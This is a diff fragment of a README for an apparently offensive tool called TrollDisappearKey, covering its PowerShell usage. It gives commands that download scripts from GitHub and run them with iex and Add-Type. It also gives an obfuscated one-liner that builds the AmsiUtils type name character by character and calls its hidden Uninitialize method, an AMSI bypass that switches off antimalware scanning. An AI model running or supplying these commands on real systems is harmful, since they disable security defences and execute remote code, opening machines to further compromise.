@@ -19,23 +19,19 @@ This breaks the provider dlls loading process and we are able to assembly load a
 ## .powershell Usage (does not require admin)
 ![Image](https://github.com/user-attachments/assets/f6b4d83a-ed24-433b-9e2a-4cf6bfe1d1b0)
 ```
-#For PS Script
+##For PS Script
 iex(iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/refs/heads/main/TrollDisappearKeyPS.ps1 -UseBasicParsing).content
 
-#For PS dll reflective
-pwd  # run any random command first, wait for powershell to fully load. THIS IS A MUST
-
+##For PS dll reflective
+invoke-blah  # run any random command first, wait for powershell to fully load. THIS IS A MUST
 $code = (iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/refs/heads/main/TrollDisappearKeyPS.cs -UseBasicParsing).content
 Add-Type $code
 [TrollDisappearKeyPS]::DisappearKey()
-
 ([Ref].Assembly.GetType([System.String]::Join("", "S", "y", "s", "t", "e", "m", ".", "M", "a", "n", "a", "g", "e", "m", "e", "n", "t", ".", "A", "u", "t", "o", "m", "a", "t", "i", "o", "n", ".", "A", "m", "s", "i", "U", "t", "i", "l", "s")).GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize).Invoke($object,$null)
 ```
 
 ## Detections 
 ![Image](https://github.com/user-attachments/assets/60ff00a8-b619-407e-8083-29efc38c632d)
-
-
 
   
 ## .exe Usage (does not require admin) 
